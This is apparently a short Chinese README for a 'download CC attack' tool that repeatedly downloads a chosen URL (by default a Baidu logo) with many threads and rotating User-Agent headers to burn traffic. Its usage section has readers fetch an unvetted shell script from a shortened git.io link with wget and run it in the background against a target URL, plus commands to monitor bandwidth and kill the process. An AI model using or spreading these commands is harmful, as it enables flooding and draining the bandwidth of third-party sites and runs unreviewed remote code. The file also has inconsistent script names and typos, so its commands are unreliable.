＃多线程刷流量 Download cc attack
  
  会自动更换UA头，多线程下载
  
##使用方法
  
  默认会刷百度logo
  
  wget -O dcc.sh git.io/Jftkm
  bash dcc.sh &
  
  如果需要改为别的地址可以这样
 
  wget -O dcc.sh git.io/Jftkm
  bash dcc.sh "https://www.baidu.com" &  #指定url
  bash oss.sh "https://www.baidu.com" 8 & #指定url和8线程
  
##查看使用流量（执行此命令起）

  apt install -y iftop && iftop -i eth0
  yum install -y iftop && iftop -i eth0
  
##如果网卡不是eth0可以改一下，看网卡名可以用这条命令
  apt insatll -y net-tools && ifconfig
  yum insatll -y net-tools && ifconfig

##结束命令
  pkill bash && pkill wget
